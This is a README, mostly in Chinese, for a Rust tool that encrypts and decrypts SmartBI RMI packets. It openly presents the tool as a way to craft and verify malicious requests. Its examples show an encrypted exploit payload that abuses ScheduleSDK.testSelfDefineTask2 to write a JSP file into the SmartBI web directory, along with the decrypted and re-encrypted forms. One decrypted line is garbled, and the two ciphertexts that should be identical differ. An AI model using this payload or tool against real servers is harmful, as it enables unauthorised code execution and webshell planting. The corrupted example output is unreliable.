# SmartBI RMI Tool
```bash
SmartBI RMI Tool
Author: Arrowzzzzzz
SmartBI RMI encryption or decryption tool for data in request and response packets

USAGE:
    SmartBI_RMI_encryption_decryption [OPTIONS]

OPTIONS:
    -d, --decryption <Decryption>     SmartBI RMI decryption or data in request packets
    -e, --encryption <Encryption>     SmartBI RMI encryption or data in request packets
    -h, --help                        Print help information
    -r, --response <RE_Decryption>    SmartBI RMI decryption or data in response packets
```
**SmartBI RMI Tool** 是一个基于Rust编写的命令行工具，主要用于SmartBI RMI 接口数据的加解密。

## 项目功能

1. 解密 RMI 请求包数据：你可以输入恶意的 RMI 请求数据，然后获取相应的攻击 payload。

   ```bash
   SmartBI_RMI_encryption_decryption -d "WiIphQSpWTl+kpDkWpS_Tp_R6p*(DGu+/JV/uu/aJ/OK/'9/aK/VV/VT/a9/VK/Ou/aJ/Vt/mJ/a9/mV/Oa/aJ/VT/mJ/uu/ut/uu/aJ/OK/'9/aK/VV/VT/a9/VK/Ou/aJ/Vt/mJ/a9/mV/Oa/aJ/VT/mJ/uu/ut/uu/uu/ut/uug(4/u7_/NT/u76pb/u7L(iG(-pDq.(g(qRwqxRSpA/Jt/uuT/NO/uxDd(4k~R/ux*wdi(k/uxbp~(55D/uxDd(4k~R/uxgRDRw6/uxkuuuq.D5/Jt/uuE/NV/Jt4/Jt6g(4/u7_R6/u7/NT6pb/u7L(iG(-pDq.(g(qRwqxRSpoQk5QkWk4p(dA_E/NV/Jt4/Jt6g(4/u7_4/u7/NT6pb/u7L(iG(-pDq.(g(qRwqoQk5QkWk4p(dlldb -hRkp4A_R6E/NV/Jt4/Jt6_4qb4RkpA/Jt/uu/Nt/uJ/NT6pb/u7.(g(qQkRSqT(kpAE/uJ/Na/Jt/uuE/NV/Jt4/Jt6_4qiSwDpAE/NV/uu/ut/uu(hdR6/uu"

   ---------------------------------Decryption data-----------------------------------------------
   Decryption data:ScheduleSDK+testSelfDefineTask2+["备份索引目录","备份索引目录","","var f= new Packages.java.io.File(\"D:/smartbi/Tomcat/webapps/smartbi/vision/t222.jsp\");\r\nvar fin =new Packages.java.io.FileOutputStream(f);\r\nvar fr =new Packages.java.io.OutputStreamKKmw gditer(fin);\r\nfr.write(\"<%=new java.util.Date()%>\");\r\nfr.close();","admin"
   ```

2. 解密 RMI 返回数据：你可以输入恶意的 RMI 请求数据对应的返回数据，然后查看是否攻击成功。

   ```bash
   SmartBI_RMI_encryption_decryption -r "H~CxOm~"{"xPh)3DfZl)if3ADfPAkh3","H~*2KC"

   ---------------------------------Decryption data-----------------------------------------------
   Decryption data:retCode{CLIENT_USER_NOT_LOGIN,result
   ```
2. 加密 RMI 请求包数据：你可以输入恶意的 payload 加密成 RMI 能接收的数据，然后测试攻击 payload 是否有效。
   ```bash
   SmartBI_RMI_encryption_decryption -e 'ScheduleSDK+testSelfDefineTask2+%5B%22%E5%A4%87%E4%BB%BD%E7%B4%A2%E5%BC%95%E7%9B%AE%E5%BD%95%22%2C%22%E5%A4%87%E4%BB%BD%E7%B4%A2%E5%BC%95%E7%9B%AE%E5%BD%95%22%2C%22%22%2C%22var%20f%3D%20new%20Packages.java.io.File(%5C%22D%3A%2Fsmartbi%2FTomcat%2Fwebapps%2Fsmartbi%2Fvision%2Ft222.jsp%5C%22)%3B%5Cr%5Cnvar%20fin%20%3Dnew%20Packages.java.io.FileOutputStream(f)%3B%5Cr%5Cnvar%20fr%20%3Dnew%20Packages.java.io.OutputStreamWriter(fin)%3B%5Cr%5Cnfr.write(%5C%22%3C%25%3Dnew%20java.util.Date()%25%3E%5C%22)%3B%5Cr%5Cnfr.close()%3B%22%2C%22admin%22'

   --------------------------------Encryption data------------------------------------------------
   Encryption data:WiIphQSpWTl+kpDkWpS_Tp_R6p*(DGu+/JV/uu/aJ/OK/'9/aK/VV/VT/a9/VK/Ou/aJ/Vt/mJ/a9/mV/Oa/aJ/VT/mJ/uu/ut/uu/aJ/OK/'9/aK/VV/VT/a9/VK/Ou/aJ/Vt/mJ/a9/mV/Oa/aJ/VT/mJ/uu/ut/uu/uu/ut/uug(4/u7_/NT/u76pb/u7L(iG(-pDq.(g(qRwqxRSpA/Jt/uuT/NO/uxDd(4k~R/ux*wdi(k/uxbp~(55D/uxDd(4k~R/uxgRDRw6/uxkuuuq.D5/Jt/uuE/NV/Jt4/Jt6g(4/u7_R6/u7/NT6pb/u7L(iG(-pDq.(g(qRwqxRSpoQk5QkWk4p(dA_E/NV/Jt4/Jt6g(4/u7_4/u7/NT6pb/u7L(iG(-pDq.(g(qRwqoQk5QkWk4p(d!4Rkp4A_R6E/NV/Jt4/Jt6_4qb4RkpA/Jt/uu/Nt/uJ/NT6pb/u7.(g(qQkRSqT(kpAE/uJ/Na/Jt/uuE/NV/Jt4/Jt6_4qiSwDpAE/NV/uu/ut/uu(hdR6/uu
   ```

## 数据输出

所有的结果将会被打印到console中。

## 许可证

Apache License 2.0
